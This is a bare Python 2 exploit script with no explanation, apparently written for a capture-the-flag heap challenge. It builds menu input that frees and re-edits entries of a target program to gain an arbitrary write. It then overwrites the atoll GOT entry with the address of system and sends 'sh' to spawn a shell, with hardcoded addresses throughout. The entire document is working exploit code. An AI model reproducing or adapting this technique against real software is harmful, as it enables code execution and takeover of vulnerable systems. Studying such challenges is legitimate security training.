#!/bin/python2
import binascii

def bhex(digit):
    digit = hex(digit)[2:]
    if(len(digit) & 1): #bitwise is odd
        digit = "0"+digit
    return binascii.unhexlify(digit)

id = 1
name = 2
payload = ""
def new(name,id):
    string = ""
    string += "1\n"
    string += str(name)+"\n"
    string += id+"\n"
    return string
def dele(id,which):
    string = ""
    string += "3\n"
    string += str(id)+"\n"
    string += str(which)+"\n"
    return string
def edit(id,which,what):
    string = ""
    which = (4,5)[which == 1]
    string += str(which)+"\n"
    string += str(id)+"\n"
    string += str(what)+"\n"
    return string
aff= "2\n"

nom=""
idd=""

r = 4
for i in range(r):
    payload += new(nom,idd)
    payload += dele(i,name)
    payload += dele(i,id)
for i in range(r):
    payload += dele(i,nom)

old = 0x604840

# id0pos = "\x60\x47\x88"[::-1]
id0pos = bhex(0x604788)[::-1]
where = bhex(0x602048)[::-1] #atoll adress
what=bhex(0x7ffff7de9dd0)[::-1] #system adress, may change depending of your system
# where="\x40\x0f\xc8"[::-1]

payload += aff
payload += edit(2,name,id0pos) # Name can only write 7 bit, overwrite name3 pointer to id0 location
payload += edit(3,name,where) # Chose where id0 write
payload += edit(0,id,what) # Arbitrary write
payload += "sh"

print payload
